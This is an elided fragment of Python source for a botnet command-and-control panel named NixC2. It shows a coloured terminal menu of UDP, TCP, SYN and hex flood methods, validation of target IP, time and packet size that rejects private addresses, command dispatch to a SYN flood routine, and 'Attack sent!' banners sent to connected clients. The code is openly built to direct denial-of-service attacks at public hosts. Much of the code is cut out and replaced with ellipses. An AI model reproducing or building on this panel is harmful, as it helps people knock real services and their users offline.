...
\x1b[3;31;40m    ║\033[1;37m LOGO    [Shows NixC2 logo]       
...
\x1b[3;31;40m    ║═══════════════════════════════════════════════════════════╗             
\x1b[3;31;40m    ║\033[1;37m  LAYER4   * .udp        UDP Flood             
\x1b[3;31;40m    ║\033[1;37m  LAYER4   * .tcp        TCP Flood                 
\x1b[3;31;40m    ║\033[1;37m  LAYER4   * .syn        SYNchromize Flood          
\x1b[3;31;40m    ║\033[1;37m  LAYER4   * .tcpsyn     TCP/SYN Flood          
\x1b[3;31;40m    ║\033[1;37m  LAYER4   * .hex        Specific HEXADECIMAL Flood            
\x1b[3;31;40m    ╚═══════════════════════════════════════════════════════════╝
"""
...
def validate_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(
        0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private
...
def validate_time(time):
    return time.isdigit() and 10 <= int(time) <= 1300


# Validate buffer size
def validate_size(size):
    return size.isdigit() and 1 < int(size) <= 65500
...
def send(sock_socket, data, escape=True, reset=True):
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    sock_socket.send(data.encode())
    ...
    while True:
        try:
            ...
            if command == 'HOW':
                ...
                syn(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast,
                    data)
...
def attack_sent1(ip, port, secs, client, command):
    send(client, f"")
    ...
    send(client, f"\x1b[3;31;40m    ║              \033[1;37mMethod : {command}")
    send(client, f"\x1b[3;31;40m    ║  ")
    send(client, f"\x1b[3;31;40m    ╚═══════════════════════════════════════════════════════════╝")
    send(client, f"")


def attack_sent2(ip, port, secs, size, client, command):
    send(client, f"")
    send(client, f"\x1b[3;31;40m                   ╔═════════════════════════════╗")
    send(client, f"\x1b[3;31;40m                   ║         \033[1;37mAttack sent!        ║")
    send(client, f"\x1b[3;31;40m          ╔═══════════════════════════════════════════════╗")
...
def main():
    ...
    while True:
        try:
            ...
            threading.Thread(target=handle_client(c, addr))
